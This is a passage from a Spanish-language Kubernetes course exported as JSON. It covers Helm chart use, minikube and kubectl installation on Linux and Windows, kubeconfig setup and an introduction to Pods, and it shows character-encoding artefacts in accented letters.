        \nstable\tcharts.helm.sh/stable\n\nPodemos buscar m√°s repositorios de charts buscando en la p√°gina Artifact Hub, por ejemplo podemos a√±adir el repositorio de charts de Bitnami de la siguiente manera:\nhelm repo add bitnami charts.bitnami.com/bitnami\n&quot;bitnami&quot; has been added to your repositories\n\nY podemos comprobar que hemos a√±adido un nuevo repositorio:\nhelm repo list\nNAME   \tURL                               \nstable \tcharts.helm.sh/stable     \nbitnami\tcharts.bitnami.com/bitnami\n\nSi queremos actualizar la lista de charts ofrecidos por los repositorios:\nhelm repo update\nHang tight while we grab the latest from your chart repositories...\n...Successfully got an update from the &quot;stable&quot; chart repository\n...Successfully got an update from the &quot;bitnami&quot; chart repository\nUpdate Complete. ‚éàHappy Helming!‚éà\n\n\nBuscar charts\nComo hemos comentado anteriormente, los charts los podemos buscar en la p√°gina Artifact Hub o los podemos buscar desde la l√≠nea de comandos, por ejemplo si queremos buscar un chart relacionado con nginx:\nhelm search repo nginx\nNAME                            \tCHART VERSION\tAPP VERSION\tDESCRIPTION                                       \nbitnami/nginx                   \t9.3.0        \t1.21.0     \tChart for the nginx server                        \nbitnami/nginx-ingress-controller\t7.6.12       \t0.47.0     \tChart for the nginx Ingress controller            \nstable/nginx-ingress            \t1.41.3       \tv0.34.1    \tDEPRECATED! An nginx Ingress controller that us...\nstable/nginx-ldapauth-proxy     \t0.1.6        \t1.13.5     \tDEPRECATED - nginx proxy with ldapauth            \n...\n\nPara obtener informaci√≥n sobre el chart bitnami/nginx podemos buscar en Artifact Hub.\nTodos los ficheros yaml que forman parte de un chart est√°n parametrizados, es decir cada propiedad tiene un valor por defecto, pero a la hora de instalarlo se puede cambiar. Por ejemplo, ¬øqu√© tipo de Service se crear√° al instalar el chart bitnami/nginx? Por defecto, el par√°metro service.type tiene como valor LoadBalancer, pero si queremos un Service de tipo NodePort, podremos redefinir este par√°metro a la hora de instalar el chart.\n¬øY c√≥mo sabemos los par√°metros que tiene definido cada chart y sus valores por defecto?. Estudiando la documentaci√≥n del chart en Artifact Hub. En concreto para el chart con el que estamos trabajando, accediendo a la url artifacthub.io/packages/helm/bitnami/nginx. Tambi√©n podemos obtener esta informaci√≥n ejecutando el siguiente comando:\nhelm show all bitnami/nginx\n\n\nInstalaci√≥n del chart\nPara instalar el chart ejecutamos la siguiente instrucci√≥n:\nhelm install serverweb bitnami/nginx --set service.type=NodePort\n\nComo vemos hemos nombrado el chart desplegado (serverweb), indicado el chart (bitnami/nginx) y, en este caso, hemos redefinido el par√°metro service.type.\nCuando se despliega el chart se nos ofrece informaci√≥n que nos muestra c√≥mo acceder a la aplicaci√≥n:\nNOTES:\n** Please be patient while the chart is being deployed **\n\nNGINX can be accessed through the following DNS name from within your cluster:\n\n    serverweb-nginx.default.svc.cluster.local (port 80)\n\nTo access NGINX from outside the cluster, follow the steps below:\n\n1. Get the NGINX URL by running these commands:\n\n    export NODE_PORT=$(kubectl get --namespace default -o jsonpath=&quot;{.spec.ports[0].nodePort}&quot; services serverweb-nginx)\n    export NODE_IP=$(kubectl get nodes --namespace default -o jsonpath=&quot;{.items[0].status.addresses[0].address}&quot;)\n    echo &quot;http://${NODE_IP}:${NODE_PORT}&quot;\n\nSi queremos acceder a la aplicaci√≥n desde el exterior debemos ejecutar las tres √∫ltimas instrucciones, que nos muestran la ip de nuestro cluster y el puerto asignado al Service NodePort.\nSiempre podemos volver a ver esta informaci√≥n ejecutando la siguiente instrucci√≥n:\nhelm status serverweb\n\nPodemos comprobar los Deployments que hemos realizado con Helm, ejecutando:\nhelm ls\nNAME     \tNAMESPACE\tREVISION\tUPDATED                                 \tSTATUS  \tCHART      \tAPP VERSION\nserverweb\tdefault  \t1       \t2021-06-29 19:11:15.975016119 +0200 CEST\tdeployed\tnginx-9.3.0\t1.21.0   \n\nY podemos comprobar tambi√©n los recursos que se han creado en el cluster:\nkubectl get all\nNAME                                   READY   STATUS    RESTARTS   AGE\npod/serverweb-nginx-7b7f75d476-kxq8j   1/1     Running   0          56s\n\nNAME                      TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)        AGE\nservice/kubernetes        ClusterIP   10.96.0.1      &lt;none&gt;        443/TCP        5m14s\nservice/serverweb-nginx   NodePort    10.99.80.141   &lt;none&gt;        80:30137/TCP   56s\n\nNAME                              READY   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/serverweb-nginx   1/1     1            1           56s\n\nNAME                                         DESIRED   CURRENT   READY   AGE\nreplicaset.apps/serverweb-nginx-7b7f75d476   1         1         1       56s\n\nPor √∫ltimo, para desinstalar una aplicaci√≥n completa, ejecutamos:\nhelm delete serverweb\nrelease &quot;serverweb&quot; uninstalled\n\nAunque no entra en el √°mbito de este curso, hay que indicar que si nosotros desarrollamos una aplicaci√≥n podemos empaquetarla para instalarla con Helm, creando nuestros propios charts. Para m√°s informaci√≥n puedes entrar en la documentaci√≥n oficial."},"Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.0-instalacion-de-kubernetes":{"title":"2.0-instalacion-de-kubernetes","links":[],"tags":[],"content":"2. Instalaci√≥n de Kubernetes\nEn este m√≥dulo vamos a estudiar los siguientes temas:\n\nAlternativas para instalaci√≥n simple de k8s\nInstalaci√≥n de minikube\nInstalaci√≥n y configuraci√≥n de kubectl\nDespliegues de aplicaciones en Kubernetes\n"},"Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.1-alternativas-para-instalacion-simple-de-k8s":{"title":"2.1-alternativas-para-instalacion-simple-de-k8s","links":[],"tags":[],"content":"2.1 Alternativas para instalaci√≥n simple de k8s\nKubernetes es un software pensado para poner en producci√≥n aplicaciones m√°s o menos complejas que se ejecutan sobre contenedores, garantizando su disponibilidad, escalabilidad y actualizaci√≥n sin interrupciones.\nEn un entorno en producci√≥n no se instala Kubernetes en un solo equipo (nodo), sino que creamos un cluster de nodos que permita garantizar el funcionamiento ininterrumpido de las aplicaciones incluso en el caso de que uno o varios de los nodos del cluster tengan alg√∫n tipo de incidencia.\nConfigurar y actualizar un cluster de Kubernetes es una tarea compleja, pero existe la posibilidad de instalar de forma f√°cil un cluster de Kubernetes compuesto por un solo nodo o un conjunto peque√±o para algunos casos de uso, como en el caso de la instalaci√≥n de un entorno de desarrollo o aprendizaje, que es precisamente la situaci√≥n que tenemos en nuestro caso. Estas instalaciones de Kubernetes no son adecuadas para entornos en producci√≥n, pero nos permiten utilizar Kubernetes de forma sencilla, conocer los objetos y atacar la API sin tener que utilizar una instalaci√≥n m√°s compleja o costosa.\nminikube\nMinikube permite desplegar localmente un ‚Äúcluster‚Äù de Kubernetes con un solo nodo. Minikube es un proyecto oficial de Kubernetes y es probablemente la soluci√≥n m√°s adecuada para aprender a usar k8s, ya que es un proyecto maduro y muy sencillo de instalar. Los requisitos m√≠nimos para instalar minikube en nuestro equipo son:\n\n2 CPUs\n2GiB de memoria\n20GiB de espacio libre en disco\nUn sistema de virtualizaci√≥n o de contenedores instalado:\n\nDocker\nHyperkit\nHyper-V\nKVM\nParallels\nPodman\nVirtualBox\nVMWare\n\n\n\nMinikube instalar√° un nodo de Kubernetes en el sistema de virtualizaci√≥n/contenedores que prefiramos, siendo unas opciones m√°s adecuadas que otras dependiendo del sistema operativo de nuestro equipo, tal como se muestra en minikube.sigs.k8s.io/docs/drivers/. En versiones recientes, es posible aumentar el n√∫mero de nodos del cluster de minikube, aunque para el objetivo de este curso no es necesario y haremos la instalaci√≥n est√°ndar de un solo nodo.\nLos detalles para la instalaci√≥n local de minikube los explicamos en la siguiente secci√≥n, ya que va a ser el m√©todo recomendado para realizar este curso.\nkubeadm\nkubeadm es una soluci√≥n m√°s realista que minikube si se instala un cluster de Kubernetes con varios nodos. Su instalaci√≥n no es especialmente compleja, pero no est√° tan automatizada como minikube y necesita m√°s recursos y tiempo para configurarlo. kubeadm es una opci√≥n muy interesante cuando queremos ver de forma detallada la diferencia entre lo que se ejecuta en el nodo controlador y en los nodos workers, que no se puede apreciar en minikube.\nLa instalaci√≥n de kubeadm se realiza t√≠picamente en varias m√°quinas virtuales o varias instancias de nube y dejamos un par de enlaces para quienes est√©n m√°s interesados en indagar en este software:\n\nkubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/\nwww.josedomingo.org/pledin/2018/05/instalacion-de-kubernetes-con-kubeadm/\n\nkind\nkind (kubernetes in docker) es un proyecto oficial de Kubernetes m√°s reciente que los dos anteriores y que permite desplegar un cluster de Kubernetes con varios nodos sobre docker. Es tambi√©n muy interesante como opci√≥n de instalaci√≥n local y de forma an√°loga al anterior, dejamos un par de enlaces para quienes est√©n interesados en probarlo:\n\nkind.sigs.k8s.io/docs/user/quick-start/\nwww.josedomingo.org/pledin/2021/02/kubernetes-con-kind/\n\nk3s\nA diferencia de las opciones anteriores, k3s es una distribuci√≥n de Kubernetes que s√≠ est√° pensada para poner en producci√≥n, pero en unas circunstancias peculiares como son su uso para IoT, edge computing y en general para configurar clusters de Kubernetes en sistemas de pocos recursos (k3s es por ejemplo la opci√≥n m√°s adecuada para usar Kubernetes en la arquitectura arm). k3s no es un proyecto oficial de Kubernetes, sino que lo comenz√≥ a desarrollar la empresa Rancher y hoy en d√≠a lo mantiene la Cloud Native Computing Foundation.\nLos pasos para la instalaci√≥nde k3s est√°n disponibles en:\n\nrancher.com/docs/k3s/latest/en/installation/\n\nConclusi√≥n\nAunque existen m√∫ltiples opciones de instalaci√≥n de Kubernetes, en este curso utilizaremos minikube que es el proyecto m√°s maduro y que consideramos m√°s adecuado para comenzar y centrarnos directamente en el uso de Kubernetes, obviando inicialmente los detalles de la instalaci√≥n de Kubernetes, que realmente es un proceso complejo y que no es lo m√°s adecuado para empezar."},"Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.2-introduccion-a-la-instalacion-de-minikube":{"title":"2.2-introduccion-a-la-instalacion-de-minikube","links":[],"tags":[],"content":"2.2 Introducci√≥n a la instalaci√≥n de minikube\nEl ‚Äúcl√∫ster‚Äù de k8s que vamos a utilizar en este curso es el de un solo nodo que va a encargarse de realizar tanto las tareas de master, con los componentes principales de Kubernetes, como de worker, ejecutando las cargas de trabajo en contenedores (ya veremos m√°s adelante que realmente utiliza algo que se llama Pod).\nMinikube se distribuye como un programa que se instala en nuestra m√°quina f√≠sica (podr√≠a instalarse igualmente en una m√°quina virtual a la que tuvi√©semos acceso completo) y que al ejecutarlo crea una m√°quina virtual linux con un cl√∫ster de Kubernetes completamente configurado y listo para su uso. Podemos instalar minikube en nuestra m√°quina con sistema linux, windows o mac y en una variedad importante de sistemas de virtualizaci√≥n, aunque en el curso recomendaremos s√≥lo algunas combinaciones que hemos probado y que incluyen toda la funcionalidad necesaria para realizar el curso.\nNota: Puede haber interacci√≥n si utilizamos m√°s de un sistema de virtualizaci√≥n en nuestro equipo, por ejemplo, la utilizaci√≥n en Windows de virtualbox para unas cosas e hyper-v para minikube, puede dar lugar a problemas, por lo que en general es recomendable usar un solo sistema de virtualizaci√≥n.\nCombinaciones de sistema operativo/virtualizaci√≥n recomendadas para el curso:\n\nLinux + KVM\nLinux + VirtualBox\nWindows + VirtualBox\n\nNota: Recomendamos la instalaci√≥n de Kubernetes en un sistema Linux (Debian o Ubuntu), bien con KVM o con VirtualBox. Sabemos por experiencia, que da menos problemas que en un sistema Windows."},"Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.3-instalacion-de-minikube-en-linux-con-kvm-virtualbox":{"title":"2.3-instalacion-de-minikube-en-linux-con-kvm-virtualbox","links":[],"tags":[],"content":"2.3 Instalaci√≥n de minikube en linux con KVM/VirtualBox\nAccedemos a minikube.sigs.k8s.io/docs/start/ y seleccionamos el m√©todo que prefiramos para instalar, eligiendo nuestro sistema operativo, arquitectura, etc.\nMinikube se instala, como otras aplicaciones de Go, como un binario enlazado est√°ticamente (autoconsistente), que no tiene dependencias de nada y que tenemos que ubicar en alg√∫n directorio del PATH de nuestro sistema. Veamos en particular la instalaci√≥n directa del binario en un sistema linux:\nPaso 1: Descargamos como usuario normal y con ayuda de la aplicaci√≥n curl, la √∫ltima versi√≥n del binario de minikube (en este caso para arquitectura x86-64):\ncurl -LO storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64\n\nPaso 2: Movemos el binario a un directorio del PATH (lo recomendable en este caso ser√≠a /usr/local/bin/) y establecemos permisos de ejecuci√≥n. Todo esto puede hacerse con los comandos mv y chmod, o de forma m√°s sencilla con install\nsudo install minikube-linux-amd64 /usr/local/bin/minikube\n\nComprobamos que se ha instalado correctamente con:\nminikube version\n\nminikube version: v1.29.0\ncommit: ddac20b4b34a9c8c857fc602203b6ba2679794d3\n\nCreaci√≥n del cl√∫ster de k8s\nEl siguiente paso consiste en lanzar minikube para que cree el cluster de Kubernetes de un solo nodo (master+worker). Minikube puede crear este cluster en diversos sistemas de virtualizaci√≥n o sobre docker, lo recomendable es visitar la p√°gina de ‚Äúdrivers‚Äù y seleccionar el m√©todo m√°s adecuado para nuestro sistema.\nDe forma general, se crear√° el cl√∫ster de Kubernetes a trav√©s de minikube, mediante la instrucci√≥n:\nminikube start\n\nAunque de forma m√°s concreta, especificaremos el ‚Äúdriver‚Äù a utilizar, por ejemplo:\nminikube start --driver=kvm2\n\nEsto crear√° de forma autom√°tica una m√°quina virtual o un contenedor en el sistema escogido e instalar√° Kubernetes en ella. Por √∫ltimo, se configura kubectl si est√° instalado (el cliente de l√≠nea de comandos de k8s) para que utilice el cluster reci√©n instalado. Podemos ver una salida t√≠pica de la instalaci√≥n del cluster a continuaci√≥n:\nüòÑ  minikube v1.29.0 en Debian 11.6\n‚ú®  Using the kvm2 driver based on user configuration\nüëç  Starting control plane node minikube in cluster minikube\nüî•  Creando kvm2 VM (CPUs=2, Memory=3900MB, Disk=20000MB) ...\nüê≥  Preparando Kubernetes v1.25.3 en Docker 20.10.8...\n    ‚ñ™ Generating certificates and keys ...\n    ‚ñ™ Booting up control plane ...\n    ‚ñ™ Configuring RBAC rules ...\nüîé  Verifying Kubernetes components...\n    ‚ñ™ Using image gcr.io/k8s-minikube/storage-provisioner:v5\nüåü  Complementos habilitados: default-storageclass, storage-provisioner\nüí°  kubectl not found. If you need it, try: &#039;minikube kubectl -- get pods -A&#039;\nüèÑ  Done! kubectl is now configured to use &quot;minikube&quot; cluster and &quot;default&quot; namespace by default\n\nEn la √∫ltima l√≠nea de la salida podemos ver que se ha intentado configurar apropiadamente kubectl, a pesar de que no est√° instalado en el equipo, paso que haremos en el siguiente apartado.\nPodemos comprobar en cualquier momento el estado de minikube con la instrucci√≥n:\nminikube status\nminikube\ntype: Control Plane\nhost: Running\nkubelet: Running\napiserver: Running\nkubeconfig: Configured\n\nParada y reinicio de minikube\nPodemos parar y volver a arrancar minikube cuando sea preciso, ya que no se trata de un cl√∫ster de k8s en producci√≥n, sino de uno instalado en un equipo convencional. Esto se realiza mediante las instrucciones:\nminikube stop\n‚úã  Stopping node &quot;minikube&quot;  ...\nüõë  1 nodes stopped.\n\nminikube start\nüòÑ  minikube v1.29.0 en Debian 11.6\n...\n\nInstalaci√≥n de minikube sobre VirtualBox\nLa instalaci√≥n es similar a la que hemos explicado en este apartado, simplemente cambiaremos el driver a la hora de crear la m√°quina de minikube:\nminikube start --driver=virtualbox\n"},"Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.4-instalacion-de-minikube-en-windows-+-virtualbox":{"title":"2.4-instalacion-de-minikube-en-windows-+-virtualbox","links":[],"tags":[],"content":"2.4 Instalaci√≥n de minikube en Windows + VirtualBox\nEn este apartado vamos a instalar minikube utilizando como sistema de virtualizaci√≥n VirtualBox.\nPaso 1: Instalaci√≥n de VirtualBox\nSiga las instrucciones que encontrar√°s en la p√°gina oficial: www.virtualbox.org/.\nPaso 2: Descargamos minikube y lo instalamos\nAbrimos la PowerShell, como administrador, y ejecutamos :\nNew-Item -Path &#039;c:\\&#039; -Name &#039;minikube&#039; -ItemType Directory -Force\nInvoke-WebRequest -OutFile &#039;c:\\minikube\\minikube.exe&#039; -Uri &#039;github.com/kubernetes/minikube/releases/latest/download/minikube-windows-amd64.exe&#039; ‚ÄìUseBasicParsing\n\nEsta instrucci√≥n va a crear un directorio en c:/minikube y ah√≠ va a depositar el ejecutable minikube.exe (70MB).\nPuedes seguir cualquier otro m√©todo de descargas que encontraras en la p√°gina oficial: minikube.sigs.k8s.io/docs/start/.\nA continuaci√≥n, vamos a√±adir el binario minikube.exe al PATH:\n$oldPath = [Environment]::GetEnvironmentVariable(&#039;Path&#039;, [EnvironmentVariableTarget]::Machine)\nif ($oldPath.Split(&#039;;&#039;) -inotcontains &#039;C:\\minikube&#039;){ `\n  [Environment]::SetEnvironmentVariable(&#039;Path&#039;, $(&#039;{0};C:\\minikube&#039; -f $oldPath), [EnvironmentVariableTarget]::Machine) `\n}\n\nIMPORTANTE: Debemos cerrar la sesi√≥n, para que se cargue las variables de entorno.\nPodemos ver el valor del path: dir env:path|fl\nPaso 3: Creaci√≥n del cl√∫ster de kubernetes con minikube\nEn este apartado vamos a crear un cl√∫ster de kubernetes de un nodo. En este caso minikube crear√° una m√°quina virtual (de 2Gb de RAM, 2 vcpu y 20G de almacenamiento) en VirtualBox utilizando una imagen que configura la m√°quina con kubernetes.\nCerramos el terminal PowerShell y la volvemos abrir como administrador.\nAveriguamos la versi√≥n de minikube :\n\nEjecutamos minikube start para que construya el cl√∫ster:\n\nNo hace falta indicar el driver, pero si tenemos alg√∫n problema podemos ejecutar minikube start - -driver=virtualbox. Lo debe coger autom√°ticamente. No es necesario, tener abierto VirtualBox.\nComprobamos el estado de minikube:\n\nPodemos averiguar la IP asignada a la m√°quina donde se ha instalado el cl√∫ster ejecutando minikube ip (nos har√° falta m√°s adelante)(seguramente tu tendr√°s una ip diferente a la mostrada):\n\nCuando terminemos de trabajar con kubernetes es conveniente para la m√°quina, para ello: minikube stop. Y si por cualquier motivo necesitamos eliminar la m√°quina, ejecutaremos minikube delete."},"Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.5-instalacion-y-configuracion-de-kubectl-en-linux":{"title":"2.5-instalacion-y-configuracion-de-kubectl-en-linux","links":[],"tags":[],"content":"2.5 Instalaci√≥n y configuraci√≥n de kubectl en linux\nkubectl es la herramienta de l√≠nea de comandos utilizada para interactuar con la API de Kubernetes. Es por tanto la herramienta fundamental que vamos a utilizar durante todo el curso para gestionar nuestros objetos en el cl√∫ster reci√©n creado con minikube.\nkubectl est√° escrito en Go y de nuevo su instalaci√≥n es muy simple, ya que se trata de un binario enlazado est√°ticamente y sin dependencias. Las instrucciones para su instalaci√≥n est√°n disponibles en la documentaci√≥n de k8s. A continuaci√≥n veremos algunas de las opciones que tenemos para instalarlo.\nOpci√≥n 1. Instalar binario desde el proyecto\nAl igual que hemos hecho con minikube, podemos descargar el binario directamente desde la URL del proyecto e instalarlo en /usr/local/bin:\ncurl -LO &quot;storage.googleapis.com/kubernetes-release/release/$(curl -s storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl&quot;\nsudo install kubectl /usr/local/bin/kubectl\n\nEste binario obviamente no se actualiza y tendremos que repetir el proceso cuando se actualice.\nOpci√≥n 2. Instalar desde repositorios no oficiales\nEl t√©rmino repositorio no oficial se utiliza para aquellos repositorios que se a√±aden y que no son los propios de la distribuci√≥n que estamos utilizando. En este caso, los repositorios no oficiales los proporciona el propio proyecto k8s.\nEn el caso de las distribuciones Debian y derivadas, el repositorio es packages.cloud.google.com/apt/ y en la documentaci√≥n se detallan los pasos para instalar kubectl a trav√©s de apt.\nLa ventaja de este m√©todo respecto al anterior es que s√≠ se actualizar√° kubectl adecuadamente como cualquier otro paquete que tengamos instalado en nuestra distro.\nOpci√≥n 3. Instalar desde repositorio oficial\nEn el caso de Debian, se ha a√±adido soporte para Kubernetes a partir de la versi√≥n bullseye o Debian 11, por lo que si tenemos instalada esa versi√≥n, podemos instalar kubectl directamente con apt:\nsudo apt install kubernetes-client\n\nEn estos momentos se instala la versi√≥n 1.20 de kubectl.\nOpci√≥n 4. Instalar desde snap\nUbuntu no proporciona de forma directa un paquete con el cliente de k8s, pero s√≠ lo hace a trav√©s de snap, por lo que quienes utilicen dicho sistema, lo tienen disponible con un simple:\nsudo snap install kubectl --classic\n\nConfiguraci√≥n kubectl\nUna vez instalado kubectl podemos comprobar que est√° disponible y cu√°l es su versi√≥n, con la instrucci√≥n:\nkubectl version --short\n...\nClient Version: v1.26.3\nKustomize Version: v4.5.7\nServer Version: v1.26.1\n\n\nEn el caso anterior, estamos utilizando la versi√≥n 1.22.2 y nos informa de que no ha podido conectarse al cl√∫ster de Kubernetes con la configuraci√≥n por defecto (localhost:8080). Es decir, aunque tengamos kubectl y minikube instalados, el primero no est√° configurado todav√≠a para conectarse al cl√∫ster de k8s que ejecuta minikube.\nLa soluci√≥n m√°s sencilla es parar minikube y volverlo a arrancar, porque de esta manera minikube configurar√° autom√°ticamente kubectl. Si nos fijamos en la salida de minikube anterior, en la que no ten√≠amos instalado kubectl, aparec√≠a la l√≠nea:\nüí°  kubectl not found. If you need it, try: &#039;minikube kubectl -- get pods -A&#039;\n\nPero si lo volvemos a repetir ahora, esa l√≠nea no aparecer√° y se configurar√° kubectl para poder usar el cl√∫ster que proporciona minikube. Lo que va a hacer minikube es configurar el fichero ~/.kube/config de la siguiente manera:\napiVersion: v1\nclusters:\n- cluster:\n    certificate-authority: /home/alberto/.minikube/ca.crt\n    extensions:\n    - extension:\n        last-update: Sun, 30 Jan 2022 20:45:08 CET\n        provider: minikube.sigs.k8s.io\n        version: v1.24.0\n      name: cluster_info\n    server: https://192.168.39.115:8443\n  name: minikube\ncontexts:\n- context:\n    cluster: minikube\n    extensions:\n    - extension:\n        last-update: Sun, 30 Jan 2022 20:45:08 CET\n        provider: minikube.sigs.k8s.io\n        version: v1.24.0\n      name: context_info\n    namespace: default\n    user: minikube\n  name: minikube\ncurrent-context: minikube\nkind: Config\npreferences: {}\nusers:\n- name: minikube\n  user:\n    client-certificate: /home/alberto/.minikube/profiles/minikube/client.crt\n    client-key: /home/alberto/.minikube/profiles/minikube/client.key\n\nDonde en cada caso variar√° la direcci√≥n IP del servidor del cl√∫ster (en este caso la 192.168.39.221) y la ubicaci√≥n de los ficheros de los certificados y claves x509 (en este caso en el directorio /home/alberto).\nUna vez configurado correctamente kubectl, podemos repetir el comando:\nkubectl version\n\nClient Version: version.Info{Major:&quot;1&quot;, Minor:&quot;23&quot;, GitVersion:&quot;v1.23.3&quot;, GitCommit:&quot;816c97ab8cff8a1c72eccca1026f7820e93e0d25&quot;, GitTreeState:&quot;clean&quot;, BuildDate:&quot;2022-01-25T21:25:17Z&quot;, GoVersion:&quot;go1.17.6&quot;, Compiler:&quot;gc&quot;, Platform:&quot;linux/amd64&quot;}\nServer Version: version.Info{Major:&quot;1&quot;, Minor:&quot;22&quot;, GitVersion:&quot;v1.22.3&quot;, GitCommit:&quot;c92036820499fedefec0f847e2054d824aea6cd1&quot;, GitTreeState:&quot;clean&quot;, BuildDate:&quot;2021-10-27T18:35:25Z&quot;, GoVersion:&quot;go1.16.9&quot;, Compiler:&quot;gc&quot;, Platform:&quot;linux/amd64&quot;}\n\nComprobamos que ya aparece la versi√≥n del servidor y por tanto se ha podido conectar con el cl√∫ster que gestiona minikube. Adem√°s podemos ejecutar nuestro primer comando propiamente de kubectl:\nkubectl get nodes\nNAME       STATUS   ROLES                  AGE   VERSION\nminikube   Ready    control-plane,master   21m   v1.22.3\n\nSi queremos utilizar el autocompletado, podemos generarlo e incorporarlo a nuestro entorno con:\necho &#039;source &lt;(kubectl completion bash)&#039; &gt;&gt;~/.bashrc\n\nY para poder usarlo en esta misma sesi√≥n (no ser√° necesario m√°s adelante, ya que el fichero .bashrc se lee cada vez que se inicia una sesi√≥n):\nsource ~/.bashrc\n"},"Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.6-instalacion-y-configuracion-de-kubectl-en-windows":{"title":"2.6-instalacion-y-configuracion-de-kubectl-en-windows","links":[],"tags":[],"content":"2.6 Instalaci√≥n y configuraci√≥n de kubectl en windows\nPodemos encontrar la informaci√≥n donde nos explican la instalaci√≥n de kubectl en la documentaci√≥n. Vamos a elegir la opci√≥n de descargar el ejecutable, para ello accedemos a la PowerShell como administrador y en el directorio C./windows/system32 descargamos el ejecutable (por lo que lo vamos a tener disponible en el PATH). Para ello vamos a ejecutar:\ncurl.exe -LO storage.googleapis.com/kubernetes-release/release/v1.26.0/bin/windows/amd64/kubectl.exe\n\nUna vez instalado, desde una PowerShell sin acceso como administrador, podemos empezar a usar kubectl y comprobar si podemos acceder al cl√∫ster.\nPodemos comprobar la versi√≥n de kubectl:\n\nY ejecutar nuestro primer comando para obtener los nodos del cl√∫ster:\n"},"Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.7-despliegues-de-aplicaciones-en-kubernetes":{"title":"2.7-despliegues-de-aplicaciones-en-kubernetes","links":[],"tags":[],"content":"2.7 Despliegues de aplicaciones en Kubernetes\nVamos a resumir brevemente, con la ayuda de un par de im√°genes, la forma que tiene k8s de hacer despliegues de aplicaciones y lo compararemos con un despliegue ‚Äútradicional‚Äù.\nAunque un despliegue real tiene muchos m√°s elementos que los que vamos a exponer a continuaci√≥n, con idea de simplificarlo todo y centrarnos en la diferencia de los elementos que intervienen, supondremos una aplicaci√≥n ‚Äútradicional‚Äù de dos capas, en las que una serie de equipos son los que est√°n expuestos a Internet y los que pueden ejecutar una parte del c√≥digo de la aplicaci√≥n a trav√©s de servidores web (a los que de forma gen√©rica denominaremos ‚Äúfront-end‚Äù), mientras que otra serie de equipos ejecutan otra parte de c√≥digo y gestionan el almacenamiento y las bases de datos (a los que llamaremos de forma gen√©rica ‚Äúback-end‚Äù).\n\nEn la imagen anterior, vemos que el balanceador de carga expuesto al exterior recibe la petici√≥n, que asigna a alguna de las m√°quinas virtuales o f√≠sicas que forman el ‚Äúfront-end‚Äù y que √©stas a su vez se comunican con alguna de las m√°quinas del ‚Äúback-end‚Äù a trav√©s del balanceador de carga intermedio.\nEn el caso de Kubernetes, esto se realiza utilizando una serie de objetos internos, que normalmente se ejecutan sobre contenedores, denominados Pods, ReplicaSets, Deployments, Services e Ingress Controllers. Hay bastantes m√°s objetos de k8s, pero nos centraremos en √©stos que son los principales.\nEn la siguiente imagen podemos ver la forma en la que una petici√≥n externa se gestionar√≠a:\n\nEn los siguientes m√≥dulos veremos uno a uno estos objetos de k8s y aprenderemos paso a paso c√≥mo se interact√∫a con ellos y c√≥mo se definen, pero a modo de resumen, podemos enumerar sus principales funciones en la siguiente lista:\n\nPods: ejecutan los contenedores\nReplicaSets:\n\nSe encargan de que no haya ca√≠da del servicio\nGestionan la tolerancia a fallos\nProporcionan escalabilidad din√°mica\n\n\nDeployments:\n\nGestionan las actualizaciones continuas\nRealizan despliegues autom√°ticos\n\n\nServices:\n\nGestionan el acceso a los pods\nBalancean la carga entre los Pods disponibles\n\n\nIngress:\n\nGestionan el acceso desde el exterior a trav√©s de nombre\n\n\n"},"Despliegue-de-aplicaciones-web/kubernetes/3.-contenedores-en-kubernetes-pods/3.0-contenedores-en-kubernetes":{"title":"3.0-contenedores-en-kubernetes","links":[],"tags":[],"content":"3. Contenedores en Kubernetes: Pods\nLa unidad m√°s peque√±a que puede utilizar Kubernetes es el Pod, en ingl√©s Pod significa ‚Äúvaina‚Äù, y podemos entender un Pod como una envoltura que contiene uno o varios contenedores (en la mayor√≠a de los casos un solo contenedor). De forma gen√©rica, un Pod representa un conjunto de contenedores que comparten almacenamiento y una √∫nica IP.\nUn aspecto muy importante que hay que ir asumiendo es que los Pods son ef√≠meros, se lanzan y en determinadas circunstancias se paran o se destruyen, creando en muchos casos nuevos Pods que sustituyan a los anteriores. Esto tiene importantes ventajas a la hora de realizar modificaciones en los despliegues en producci√≥n, pero tiene una consecuencia directa sobre la informaci√≥n que pueda tener almacenada el Pod, por lo que tendremos que utilizar alg√∫n mecanismo adicional cuando necesitemos que la informaci√≥n sobreviva a un Pod. Por lo tanto, aunque Kubernetes es un orquestador de contenedores, la unidad m√≠nima de ejecuci√≥n es el Pod, que contendr√° uno a m√°s contenedores seg√∫n las necesidades:\n\nEn la mayor√≠a de los casos y siguiendo el principio de un proceso por contenedor, evitamos tener sistemas (como m√°quinas virtuales) ejecutando docenas de procesos, por lo que lo m√°s habitual ser√° tener un Pod en cuyo interior se define un contenedor que ejecuta un solo proceso.\nEn determinadas circunstancias ser√° necesario ejecutar m√°s de un proceso en el mismo ‚Äúsistema‚Äù, como en los casos de procesos fuertemente acoplados, en esos casos, tendremos m√°s de un contenedor dentro del Pod. Cada uno de los contenedores ejecutando un solo proceso, pero pudiendo compartir almacenamiento y una misma direcci√≥n IP como si se tratase de un sistema ejecutando m√∫ltiples procesos.\n\nExisten adem√°s algunas razones que hacen que sea conveniente tener esta capa adicional por encima de la definici√≥n de contenedor:\n\nKubernetes puede trabajar con distintos sistemas de gesti√≥n de contenedores (docker, containerd, rocket, cri-o, etc) por lo que es muy conveniente a√±adir una capa de abstracci√≥n que permita utilizar Kubernetes de una forma homog√©nea e independiente del sistema de contenedores interno asociado.\nEsta capa de abstracci√≥n a√±ade informaci√≥n adicional necesaria en Kubernetes como por ejemplo, pol√≠ticas de reinicio, comprobaciones de que la aplicaci√≥n est√© inicializada (readiness probe) o comprobaciones de que la aplicaci√≥n haya realizado alguna acci√≥n especificada (liveness probe).\n\n\nPod con un solo contenedor\nEn la situaci√≥n m√°s habitual, se definir√° un Pod con un contenedor en su interior para ejecutar un solo proceso y este Pod estar√° ejecut√°ndose mientras lo 